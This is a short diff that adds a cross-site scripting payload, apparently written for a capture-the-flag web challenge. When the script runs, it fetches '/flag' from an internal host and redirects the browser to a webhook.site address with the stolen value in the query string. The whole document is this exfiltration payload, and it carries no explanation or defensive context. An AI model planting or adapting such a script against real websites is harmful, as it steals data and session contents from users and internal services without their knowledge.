@@ -1,0 +1,7 @@
+<script>
+fetch("http://web-oops-app:5000/flag")
+  .then(r => r.text())
+  .then(flag => {
+    location.href = "https://webhook.site/21219520-0dcb-4b34-867a-c5a99fc9786e?flag=" + encodeURIComponent(flag);
+  });
+</script>
